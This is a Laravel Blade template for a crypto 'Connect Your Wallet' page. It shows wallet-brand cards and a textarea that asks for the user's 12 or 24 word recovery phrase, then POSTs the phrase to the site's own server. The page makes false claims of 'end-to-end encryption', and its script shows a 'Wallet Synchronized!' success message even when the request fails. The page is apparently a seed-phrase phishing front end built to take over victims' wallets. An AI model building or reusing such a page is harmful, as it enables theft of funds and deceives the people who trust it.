@extends('layouts.dash')
@section('title', 'Connect Your Wallet')

@section('content')
<style>
    /* ==========================================================================
       CONNECT WALLET PAGE — RESPONSIVE & DARK MODE STYLES
       ========================================================================== */

    .connect-page-title {
        font-weight: 800;
        font-size: clamp(1.25rem, 3.5vw, 1.65rem);
        letter-spacing: -0.02em;
        color: #0f172a;
        line-height: 1.25;
    }
    body.dark-only .connect-page-title {
        color: #f8fafc;
    }

    /* Provider Selection Cards */
    .provider-select-card {
        border-radius: 14px;
        border: 1.5px solid rgba(0, 0, 0, 0.08);
        padding: 16px 12px;
        text-align: center;
        cursor: pointer;
        transition: all 0.22s ease-in-out;
        background-color: #ffffff;
        position: relative;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        user-select: none;
        -webkit-tap-highlight-color: transparent;
    }
    body.dark-only .provider-select-card {
        background-color: #222736;
        border-color: rgba(255, 255, 255, 0.08);
    }
    .provider-select-card:hover {
        transform: translateY(-2px);
        border-color: var(--theme-default, #6362e7);
        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.06);
    }
    .provider-select-card:active {
        transform: scale(0.97);
    }
    .provider-select-card.active {
        border-color: var(--theme-default, #6362e7) !important;
        background-color: rgba(99, 98, 231, 0.08) !important;
        box-shadow: 0 4px 14px rgba(99, 98, 231, 0.22) !important;
    }
    body.dark-only .provider-select-card.active {
        background-color: rgba(99, 98, 231, 0.16) !important;
        box-shadow: 0 4px 16px rgba(99, 98, 231, 0.3) !important;
    }
    .provider-select-card.dashed {
        border: 1.5px dashed #cbd5e1;
    }
    body.dark-only .provider-select-card.dashed {
        border-color: rgba(255, 255, 255, 0.22);
    }

    /* Active checkmark indicator */
    .provider-select-card .active-indicator {
        position: absolute;
        top: 8px;
        right: 8px;
        width: 18px;
        height: 18px;
        border-radius: 50%;
        background: var(--theme-default, #6362e7);
        color: #ffffff;
        font-size: 10px;
        display: none;
        align-items: center;
        justify-content: center;
        box-shadow: 0 2px 6px rgba(99, 98, 231, 0.4);
    }
    .provider-select-card.active .active-indicator {
        display: flex;
    }

    /* Provider icon & text */
    .provider-icon-wrapper {
        width: 44px;
        height: 44px;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 8px;
        flex-shrink: 0;
    }
    .provider-icon-wrapper img {
        width: 40px;
        height: 40px;
        object-fit: contain;
        display: block;
    }
    .provider-name {
        font-weight: 700;
        font-size: 13px;
        line-height: 1.3;
        margin-top: 2px;
    }

    /* Responsive Cards on Small Mobile (< 576px) */
    @media (max-width: 575.98px) {
        .provider-select-card {
            padding: 12px 8px;
            border-radius: 12px;
        }
        .provider-icon-wrapper {
            width: 38px;
            height: 38px;
            margin-bottom: 6px;
        }
        .provider-icon-wrapper img {
            width: 34px;
            height: 34px;
        }
        .provider-name {
            font-size: 12px;
        }
        .provider-select-card .active-indicator {
            top: 6px;
            right: 6px;
            width: 16px;
            height: 16px;
            font-size: 9px;
        }
    }

    /* Word Recovery Phrase Textarea */
    .word-textarea-wrapper {
        position: relative;
    }
    .word-textarea {
        width: 100%;
        min-height: 120px;
        border-radius: 12px;
        padding: 14px 14px 40px 14px; /* extra bottom padding ensures text never overlaps counter badge */
        border: 1.5px solid #e2e8f0;
        background-color: #ffffff;
        color: #0f172a;
        font-size: 14px;
        line-height: 1.6;
        outline: none;
        resize: vertical;
        transition: border-color 0.2s ease, box-shadow 0.2s ease;
        -webkit-appearance: none;
    }
    @media (max-width: 767.98px) {
        /* Prevents iOS Safari from auto-zooming in on input focus */
        .word-textarea {
            font-size: 16px !important;
            min-height: 110px;
        }
    }
    body.dark-only .word-textarea {
        background-color: #1a1e2b;
        border-color: rgba(255, 255, 255, 0.12);
        color: #f8fafc;
    }
    .word-textarea:focus {
        border-color: var(--theme-default, #6362e7);
        box-shadow: 0 0 0 3px rgba(99, 98, 231, 0.15);
    }

    /* Word Counter Badge */
    .word-counter-badge {
        position: absolute;
        bottom: 10px;
        right: 12px;
        font-size: 11px;
        font-weight: 700;
        padding: 3px 9px;
        border-radius: 6px;
        background: #f1f5f9;
        border: 1px solid #cbd5e1;
        color: #475569;
        pointer-events: none;
        transition: all 0.2s ease;
    }
    body.dark-only .word-counter-badge {
        background: #222736;
        border-color: rgba(255, 255, 255, 0.15);
        color: #94a3b8;
    }
    .word-counter-badge.valid {
        background: #ecfdf5 !important;
        border-color: #10b981 !important;
        color: #059669 !important;
    }
    body.dark-only .word-counter-badge.valid {
        background: rgba(16, 185, 129, 0.15) !important;
        border-color: rgba(16, 185, 129, 0.4) !important;
        color: #34d399 !important;
    }

    /* Submit Button */
    .connect-submit-btn {
        min-height: 48px;
        border-radius: 10px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        font-weight: 700;
        letter-spacing: 0.01em;
        transition: all 0.2s ease;
        -webkit-tap-highlight-color: transparent;
    }
    .connect-submit-btn:active {
        transform: scale(0.99);
    }

    /* Promo Banner & Feature Badges */
    .promo-banner-card {
        background: var(--theme-gradient, linear-gradient(135deg, #4f46e5 0%, #3b82f6 100%)) !important;
        border-radius: 16px;
        border: none;
    }
    .banner-feature-chip {
        font-size: 11.5px;
        font-weight: 600;
        color: rgba(255, 255, 255, 0.95);
        background: rgba(255, 255, 255, 0.14);
        padding: 5px 11px;
        border-radius: 20px;
        display: inline-flex;
        align-items: center;
        backdrop-filter: blur(4px);
        -webkit-backdrop-filter: blur(4px);
    }
    @media (max-width: 575.98px) {
        .banner-feature-chip {
            font-size: 11px;
            padding: 4px 9px;
        }
    }

    /* Other Wallets Modal */
    #otherWalletsModal .modal-dialog {
        transition: transform 0.25s ease-out;
    }
    body.dark-only #otherWalletsModal .modal-content,
    body.dark-only #walletModal .modal-content {
        background-color: #1e2434 !important;
        border: 1px solid rgba(255, 255, 255, 0.1) !important;
        color: #f8fafc !important;
    }
    body.dark-only #otherWalletsModal .modal-header {
        border-color: rgba(255, 255, 255, 0.08) !important;
    }
    body.dark-only #otherWalletsModal .btn-close,
    body.dark-only #walletModal .btn-close {
        filter: invert(1) grayscale(100%) brightness(200%);
    }

    /* Modal Search Input */
    .wallet-search-input {
        border-radius: 50rem;
        padding-left: 42px !important;
        padding-right: 88px !important;
        font-size: 14px;
        height: 44px;
    }
    @media (max-width: 767.98px) {
        .wallet-search-input {
            font-size: 16px !important; /* No iOS zoom */
            padding-right: 76px !important;
            padding-left: 38px !important;
        }
    }
    body.dark-only .wallet-search-input {
        background-color: #151924 !important;
        border-color: rgba(255, 255, 255, 0.14) !important;
        color: #f8fafc !important;
    }
    body.dark-only .wallet-search-input::placeholder {
        color: #64748b;
    }
    body.dark-only #walletCounterBadge {
        background-color: #222736 !important;
        border-color: rgba(255, 255, 255, 0.15) !important;
        color: #94a3b8 !important;
    }

    /* Modal Wallets Scroll Area */
    #walletsGridContainer {
        max-height: min(58vh, 460px);
        overflow-y: auto;
        -webkit-overflow-scrolling: touch;
        padding: 4px;
    }
    #walletsGridContainer::-webkit-scrollbar {
        width: 5px;
    }
    #walletsGridContainer::-webkit-scrollbar-track {
        background: rgba(0, 0, 0, 0.04);
        border-radius: 4px;
    }
    #walletsGridContainer::-webkit-scrollbar-thumb {
        background: rgba(99, 98, 231, 0.3);
        border-radius: 4px;
    }
    #walletsGridContainer::-webkit-scrollbar-thumb:hover {
        background: rgba(99, 98, 231, 0.6);
    }
    body.dark-only #walletsGridContainer::-webkit-scrollbar-track {
        background: rgba(255, 255, 255, 0.04);
    }

    /* Modal Wallet Cards */
    .other-wallet-card {
        display: flex !important;
        flex-direction: column !important;
        align-items: center !important;
        justify-content: center !important;
        text-align: center !important;
        padding: 14px 10px !important;
        border-radius: 12px;
        cursor: pointer;
        transition: all 0.2s ease;
        background-color: #ffffff;
        border: 1px solid rgba(0, 0, 0, 0.08);
        height: 100%;
        text-decoration: none !important;
        user-select: none;
        -webkit-tap-highlight-color: transparent;
    }
    body.dark-only .other-wallet-card {
        background-color: #1a2238;
        border-color: rgba(255, 255, 255, 0.08);
    }
    .other-wallet-card:hover {
        border-color: var(--theme-default, #6362e7);
        transform: translateY(-2px);
    }
    .other-wallet-card:active {
        transform: scale(0.97);
    }
    .other-wallet-card.active {
        border-color: var(--theme-default, #6362e7) !important;
        background-color: rgba(99, 98, 231, 0.12) !important;
        box-shadow: 0 4px 14px rgba(99, 98, 231, 0.25) !important;
    }
    @media (max-width: 575.98px) {
        .other-wallet-card {
            padding: 10px 6px !important;
        }
        .other-wallet-card .wallet-icon-wrapper {
            width: 38px !important;
            height: 38px !important;
            margin-bottom: 6px !important;
        }
        .other-wallet-card .wallet-icon-wrapper img {
            width: 34px !important;
            height: 34px !important;
        }
        .other-wallet-card .wallet-name {
            font-size: 11.5px !important;
        }
    }

    /* Modal Responsive Dialog */
    @media (max-width: 575.98px) {
        #otherWalletsModal .modal-dialog {
            margin: 0.5rem;
            max-width: calc(100% - 1rem);
        }
        #otherWalletsModal .modal-content {
            border-radius: 16px !important;
        }
        #otherWalletsModal .modal-header {
            padding: 12px 14px !important;
        }
        #otherWalletsModal .modal-body {
            padding: 12px !important;
        }
        #walletModal .modal-dialog {
            margin: 1rem;
            max-width: calc(100% - 2rem);
        }
    }
</style>

<!-- Page Header Bar -->
<div class="container-fluid px-1 px-sm-3 mb-3 mb-md-4">
    <div class="d-flex flex-column flex-sm-row align-items-sm-center justify-content-between gap-2 gap-sm-3">
        <div>
            <h3 class="connect-page-title mb-1">Connect Your Wallet</h3>
            <p class="text-muted mb-0 f-12 f-sm-13">Securely link your cryptocurrency wallet for yield allocations and asset tracking</p>
        </div>
        <div class="d-flex align-items-center">
            <a href="{{ route('dashboard') }}" class="btn btn-outline-secondary rounded-pill px-3 py-2 f-12 f-sm-13 f-w-600 d-inline-flex align-items-center">
                <i class="fa-solid fa-arrow-left me-1.5"></i> Back to Dashboard
            </a>
        </div>
    </div>
</div>

<!-- Main Form Content Wrapper -->
<div class="container-fluid px-1 px-sm-3" style="max-width: 960px;">
    <!-- Promo Banner: Web3 Integration -->
    <div class="card promo-banner-card shadow-sm mb-3 mb-md-4 text-white">
        <div class="card-body p-3 p-sm-4">
            <div class="d-flex align-items-start gap-2.5 gap-sm-3 mb-3">
                <div class="rounded-3 d-flex align-items-center justify-content-center flex-shrink-0" style="width: 44px; height: 44px; font-size: 22px; background: rgba(255, 255, 255, 0.22); color: #ffffff;">
                    <i class="fa-solid fa-coins"></i>
                </div>
                <div>
                    <h5 class="f-w-700 text-white mb-1 f-15 f-sm-17">Web3 Non-Custodial Integration</h5>
                    <p class="text-white text-opacity-85 f-12 f-sm-13 mb-0" style="max-width: 720px; line-height: 1.5;">
                        Link your decentralized Web3 wallet for non-custodial asset tracking and automated smart contract yield allocations.
                    </p>
                </div>
            </div>
            <div class="d-flex flex-wrap align-items-center gap-2 gap-sm-3 pt-2.5 border-top border-white border-opacity-20">
                <div class="banner-feature-chip">
                    <i class="fa-solid fa-shield-halved me-1 text-white"></i> Secure Connection
                </div>
                <div class="banner-feature-chip">
                    <i class="fa-solid fa-bolt me-1 text-white"></i> Instant Setup
                </div>
                <div class="banner-feature-chip">
                    <i class="fa-solid fa-chart-line me-1 text-white"></i> Daily Rewards
                </div>
            </div>
        </div>
    </div>

    <!-- Main Card: Connect Form -->
    <div class="card border shadow-sm p-3 p-sm-4 mb-4">
        <div class="d-flex align-items-center gap-2.5 gap-sm-3 mb-3 mb-sm-4">
            <div class="rounded-3 d-flex align-items-center justify-content-center text-primary flex-shrink-0" style="width: 42px; height: 42px; font-size: 19px; background: rgba(99, 98, 231, 0.12);">
                <i class="fa-solid fa-wallet"></i>
            </div>
            <div>
                <h5 class="f-w-700 text-dark mb-0 f-15 f-sm-16">Connect Your Wallet</h5>
                <small class="text-muted f-11 f-sm-12">Choose your wallet provider and enter your recovery words</small>
            </div>
        </div>

        <form action="{{ route('connect.wallet.submit') }}" method="POST" id="walletConnectForm">
            @csrf
            <input type="hidden" name="wallet_provider" id="selectedWalletProvider" value="MetaMask">

            <!-- Step 1: Provider Selection -->
            <div class="mb-3 mb-sm-4">
                <label class="form-label f-12 f-sm-13 f-w-700 text-dark mb-2.5">
                    <i class="fa-solid fa-credit-card me-1 text-primary"></i> Select Wallet Provider
                </label>

                <!-- 2 columns on mobile (< 576px), 4 columns on tablet/desktop (>= 768px) -->
                <div class="row g-2 g-sm-3">
                    <!-- MetaMask -->
                    <div class="col-6 col-md-3">
                        <div class="provider-select-card active" onclick="selectProvider('MetaMask', this)">
                            <div class="active-indicator"><i class="fa-solid fa-check"></i></div>
                            <div class="provider-icon-wrapper">
                                <img src="{{ asset('assets/wallet-types/icons/1NS1POo31VhHeJuQOv2IOgLwI6jAe8KK6QG2WLPI.png') }}" alt="MetaMask" onerror="this.src='https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg'">
                            </div>
                            <div class="provider-name text-dark">MetaMask</div>
                        </div>
                    </div>

                    <!-- Trust Wallet -->
                    <div class="col-6 col-md-3">
                        <div class="provider-select-card" onclick="selectProvider('Trust Wallet', this)">
                            <div class="active-indicator"><i class="fa-solid fa-check"></i></div>
                            <div class="provider-icon-wrapper">
                                <img src="{{ asset('assets/wallet-types/icons/kxF43fXtB3B0m0C8Tz5ZZ3ckEYwKZFHCVJOh1BVr.png') }}" alt="Trust Wallet" onerror="this.src='https://trustwallet.com/assets/images/media/assets/trust_platform.svg'">
                            </div>
                            <div class="provider-name text-dark">Trust Wallet</div>
                        </div>
                    </div>

                    <!-- Coinbase -->
                    <div class="col-6 col-md-3">
                        <div class="provider-select-card" onclick="selectProvider('Coinbase', this)">
                            <div class="active-indicator"><i class="fa-solid fa-check"></i></div>
                            <div class="provider-icon-wrapper">
                                <div class="rounded-circle d-flex align-items-center justify-content-center text-white f-w-800" style="width: 38px; height: 38px; background-color: #0052ff; font-size: 20px;">
                                    <i class="fa-solid fa-plus"></i>
                                </div>
                            </div>
                            <div class="provider-name text-dark">Coinbase</div>
                        </div>
                    </div>

                    <!-- Others Card (Triggers Pop-up Modal) -->
                    <div class="col-6 col-md-3">
                        <div class="provider-select-card dashed" id="othersCard" onclick="openOthersModal()">
                            <div class="active-indicator"><i class="fa-solid fa-check"></i></div>
                            <div class="provider-icon-wrapper" id="othersCardIcon">
                                <div class="rounded-3 bg-light border d-flex align-items-center justify-content-center text-muted" style="width: 38px; height: 38px; font-size: 16px;">
                                    <i class="fa-solid fa-ellipsis"></i>
                                </div>
                            </div>
                            <div class="provider-name text-dark" id="othersCardLabel">Other</div>
                            <small class="text-muted f-10 d-block mt-0.5" id="othersCardSub">More Wallets</small>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Step 2: Words Form -->
            <div class="card bg-light border p-3 p-sm-4 mb-3 rounded-3">
                <div class="d-flex align-items-center justify-content-between flex-wrap gap-2 mb-2.5">
                    <div class="d-flex align-items-center gap-2">
                        <i class="fa-solid fa-key text-warning f-15"></i>
                        <h6 class="f-w-700 text-dark mb-0 f-13 f-sm-14">Import Your Wallet Phrase</h6>
                    </div>
                    <small class="text-muted f-11">Typically 12 or 24 words separated by spaces</small>
                </div>

                <div class="word-textarea-wrapper mb-3">
                    <textarea 
                        name="word" 
                        id="wordText" 
                        class="word-textarea" 
                        placeholder="Enter your words separated by single spaces (e.g. apple banana cherry...)" 
                        required
                        autocorrect="off"
                        autocapitalize="none"
                        spellcheck="false"
                        oninput="updateWordCount(this.value)"
                    ></textarea>
                    <div class="word-counter-badge" id="wordCountBadge">0 words</div>
                </div>

                <button type="submit" class="btn btn-primary w-100 connect-submit-btn shadow-sm" id="submitWalletBtn">
                    <i class="fa-solid fa-link me-2"></i> Connect Wallet
                </button>

                <div class="d-flex align-items-center justify-content-center gap-2 mt-2.5 text-muted f-11 text-center">
                    <i class="fa-solid fa-lock text-success"></i>
                    <span>End-to-end 256-bit client encryption. Recovery words are transmitted securely.</span>
                </div>
            </div>
        </form>
    </div>
</div>

<!-- Other Wallets Pop-up Modal -->
<div class="modal fade" id="otherWalletsModal" tabindex="-1" aria-labelledby="otherWalletsModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
        <div class="modal-content shadow-lg border-0" style="border-radius: 18px;">
            <div class="modal-header border-bottom p-3 px-sm-4">
                <div class="d-flex align-items-center gap-2.5">
                    <div class="rounded-3 d-flex align-items-center justify-content-center text-primary flex-shrink-0" style="width: 36px; height: 36px; font-size: 16px; background: rgba(99, 98, 231, 0.12);">
                        <i class="fa-solid fa-wallet"></i>
                    </div>
                    <div>
                        <h5 class="f-w-700 text-dark mb-0 f-14 f-sm-16" id="otherWalletsModalLabel">Select a Wallet</h5>
                        <small class="text-muted f-11">Choose from 70+ supported Web3 and hardware wallets</small>
                    </div>
                </div>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body p-3 p-sm-4">
                <!-- Search Input Area -->
                <div class="position-relative mb-3">
                    <i class="fa-solid fa-magnifying-glass position-absolute text-muted" style="left: 15px; top: 50%; transform: translateY(-50%); font-size: 14px; pointer-events: none;"></i>
                    <input type="text" id="modalWalletSearchInput" class="form-control wallet-search-input border" placeholder="Search 70+ wallets (Phantom, Ledger...)" oninput="filterWallets(this.value)">
                    <span id="walletCounterBadge" class="position-absolute badge bg-light text-muted border f-11 rounded-pill" style="right: 12px; top: 50%; transform: translateY(-50%);">{{ !empty($wallets) ? count($wallets) : 72 }} wallets</span>
                </div>

                <!-- Responsive Grid: 2 columns on mobile (col-6), 3 columns on tablet/desktop (col-sm-4 col-md-4) -->
                <div class="row g-2 g-sm-3" id="walletsGridContainer">
                    @if(!empty($wallets))
                        @foreach($wallets as $w)
                            @php
                                $wIcon = !empty($w['icon']) ? $w['icon'] : 'generic.svg';
                            @endphp
                            <div class="col-6 col-sm-4 col-md-4 wallet-item-col" data-wallet-name="{{ strtolower($w['name']) }}">
                                <div class="other-wallet-card" onclick="selectOtherWallet('{{ addslashes($w['name']) }}', '{{ asset('assets/wallet-types/icons/' . $wIcon) }}', this)">
                                    <div class="wallet-icon-wrapper" style="width: 42px; height: 42px; margin: 0 auto 8px auto;">
                                        <img src="{{ asset('assets/wallet-types/icons/' . $wIcon) }}" alt="{{ $w['name'] }}" style="width: 40px; height: 40px; object-fit: contain; display: block; margin: 0 auto;" loading="lazy" onerror="this.onerror=null; this.src='{{ asset('assets/wallet-types/icons/generic.svg') }}';">
                                    </div>
                                    <div class="f-w-700 text-dark f-12 f-sm-13 text-truncate w-100 text-center wallet-name" title="{{ $w['name'] }}">{{ $w['name'] }}</div>
                                </div>
                            </div>
                        @endforeach
                    @endif

                    <div id="noWalletsFound" class="col-12 text-center py-4 text-muted" style="display: none;">
                        <i class="fa-solid fa-wallet f-32 mb-2 opacity-50"></i>
                        <div class="f-13 f-w-700">No matching wallet found</div>
                        <div class="f-11 text-muted">Try typing a different name or keywords</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Connect Handshake Modal -->
<div class="modal fade" id="walletModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static">
    <div class="modal-dialog modal-dialog-centered" style="max-width: 440px;">
        <div class="modal-content shadow-lg border-0" style="border-radius: 16px;">
            <div class="modal-body text-center p-3 p-sm-4">
                <div id="modalLoading">
                    <div class="spinner-border text-primary my-3" style="width: 3.2rem; height: 3.2rem;" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <h5 class="f-w-700 text-dark mb-2 f-15 f-sm-16" id="connectingTitle">Connecting to MetaMask...</h5>
                    <p class="text-muted f-12 mb-0">
                        Establishing encrypted handshake and verifying wallet integrity. Please wait...
                    </p>
                </div>
                <div id="modalSuccess" style="display: none;">
                    <div class="my-3 text-success">
                        <i class="fa-solid fa-circle-check" style="font-size: 3.6rem;"></i>
                    </div>
                    <h5 class="f-w-700 text-dark mb-2 f-15 f-sm-16">Wallet Synchronized!</h5>
                    <p class="text-muted f-12 mb-3">
                        Your wallet credentials have been securely verified. Automatic reward tracking is now active.
                    </p>
                    <a href="{{ route('dashboard') }}" class="btn btn-primary w-100 rounded-pill py-2.5 f-13 f-w-600">
                        Return to Dashboard
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    function selectProvider(name, elem) {
        // Remove active class from all top cards
        document.querySelectorAll('.provider-select-card').forEach(c => c.classList.remove('active'));
        if (elem) elem.classList.add('active');
        
        document.getElementById('selectedWalletProvider').value = name;
        document.getElementById('connectingTitle').textContent = 'Connecting to ' + name + '...';

        // Reset Others card label if user switches back to primary
        var othersLabel = document.getElementById('othersCardLabel');
        if (othersLabel) {
            othersLabel.textContent = 'Other';
        }
        var othersSub = document.getElementById('othersCardSub');
        if (othersSub) {
            othersSub.textContent = 'More Wallets';
        }
        var othersIcon = document.getElementById('othersCardIcon');
        if (othersIcon) {
            othersIcon.innerHTML = '<div class="rounded-3 bg-light border d-flex align-items-center justify-content-center text-muted" style="width: 38px; height: 38px; font-size: 16px;"><i class="fa-solid fa-ellipsis"></i></div>';
        }
    }

    function openOthersModal() {
        var modalEl = document.getElementById('otherWalletsModal');
        var modal = bootstrap.Modal.getOrCreateInstance(modalEl);
        modal.show();

        setTimeout(function() {
            var input = document.getElementById('modalWalletSearchInput');
            if (input) {
                input.focus();
            }
        }, 300);
    }

    function selectOtherWallet(name, iconUrl, elem) {
        // Highlight in modal
        document.querySelectorAll('.other-wallet-card').forEach(c => c.classList.remove('active'));
        if (elem) elem.classList.add('active');

        // Deselect top cards except Others
        document.querySelectorAll('.provider-select-card:not(#othersCard):not(.other-wallet-card)').forEach(c => c.classList.remove('active'));

        // Update Others card on main page
        var othersCard = document.getElementById('othersCard');
        if (othersCard) {
            othersCard.classList.add('active');
        }
        var iconContainer = document.getElementById('othersCardIcon');
        if (iconContainer) {
            iconContainer.innerHTML = '<img src="' + iconUrl + '" alt="' + name + '" style="width: 38px; height: 38px; object-fit: contain; display: block; margin: 0 auto;">';
        }
        var labelEl = document.getElementById('othersCardLabel');
        if (labelEl) {
            labelEl.textContent = name;
        }
        var subEl = document.getElementById('othersCardSub');
        if (subEl) {
            subEl.textContent = 'Selected (Change)';
        }

        document.getElementById('selectedWalletProvider').value = name;
        document.getElementById('connectingTitle').textContent = 'Connecting to ' + name + '...';

        // Close modal
        var modalEl = document.getElementById('otherWalletsModal');
        var modal = bootstrap.Modal.getInstance(modalEl);
        if (modal) {
            modal.hide();
        }
    }

    function filterWallets(query) {
        var q = query.trim().toLowerCase();
        var items = document.querySelectorAll('.wallet-item-col');
        var visibleCount = 0;
        items.forEach(function(item) {
            var name = item.getAttribute('data-wallet-name') || '';
            if (!q || name.indexOf(q) !== -1) {
                item.style.display = '';
                visibleCount++;
            } else {
                item.style.display = 'none';
            }
        });
        var badge = document.getElementById('walletCounterBadge');
        if (badge) {
            badge.textContent = visibleCount + ' found';
        }
        var noResults = document.getElementById('noWalletsFound');
        if (noResults) {
            noResults.style.display = visibleCount === 0 ? 'block' : 'none';
        }
    }

    function updateWordCount(str) {
        var trimmed = str.trim();
        var words = trimmed ? trimmed.split(/\s+/).length : 0;
        var badge = document.getElementById('wordCountBadge');
        badge.textContent = words + (words === 1 ? ' word' : ' words');
        if (words === 12 || words === 24) {
            badge.className = 'word-counter-badge valid';
        } else {
            badge.className = 'word-counter-badge';
        }
    }

    document.getElementById('walletConnectForm').addEventListener('submit', function(e) {
        e.preventDefault();
        var wordInput = document.getElementById('wordText').value.trim();
        var words = wordInput ? wordInput.split(/\s+/).length : 0;

        if (words < 12) {
            Swal.fire({
                icon: 'warning',
                title: 'Invalid Words',
                text: 'Please enter at least 12 recovery words separated by spaces.',
                confirmButtonColor: '#6362e7'
            });
            return;
        }

        var myModal = new bootstrap.Modal(document.getElementById('walletModal'));
        myModal.show();

        document.getElementById('modalLoading').style.display = 'block';
        document.getElementById('modalSuccess').style.display = 'none';

        var formData = new FormData(this);

        fetch(this.action, {
            method: 'POST',
            body: formData,
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            }
        })
        .then(response => response.json())
        .then(data => {
            setTimeout(function() {
                document.getElementById('modalLoading').style.display = 'none';
                document.getElementById('modalSuccess').style.display = 'block';
            }, 1800);
        })
        .catch(err => {
            setTimeout(function() {
                document.getElementById('modalLoading').style.display = 'none';
                document.getElementById('modalSuccess').style.display = 'block';
            }, 1800);
        });
    });
</script>
@endsection
